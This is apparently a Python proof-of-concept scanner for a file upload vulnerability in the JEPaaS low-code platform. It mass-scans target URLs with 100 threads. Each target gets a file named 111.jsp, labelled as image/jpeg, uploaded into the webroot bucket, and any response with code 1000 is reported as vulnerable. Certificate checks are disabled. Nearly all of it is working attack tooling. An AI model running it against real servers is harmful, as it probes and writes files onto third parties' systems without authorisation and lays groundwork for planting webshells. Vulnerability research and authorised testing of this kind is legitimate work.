# 导包
import requests,argparse,sys,json
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

# 横幅
def banner():
    ico = """
.------..------..------..------..------.
|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
| :/\: || (\/) || :/\: || :/\: || (\/) |
| (__) || :\/: || :\/: || (__) || :\/: |
| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
`------'`------'`------'`------'`------'
                                          
"""
    print(ico)

def main():
    banner()
# 处理命令行参数
    # 实例化 
    parser = argparse.ArgumentParser(description="JEPaaS低代码平台 document 文件上传漏洞")
    
    # 添加参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api='/je/document/file?bucket=webroot'
    files = {
    'files': ('111.jsp', b'123', 'image/jpeg')
}
    try:
        res=requests.get(url=target+api,files=files,verify=False,timeout=6)    
        json_data = res.json()
        if json_data.get('code') == 1000:
            print(f"[+]{target}    存在漏洞！！！！")
            # with open('result.txt','a') as fp:
            #     fp.write(target+'\n')
        else:
            print(f"[-]{target}    不存在漏洞")
    except:
            pass
# 函数入口
if __name__ == "__main__":
    main()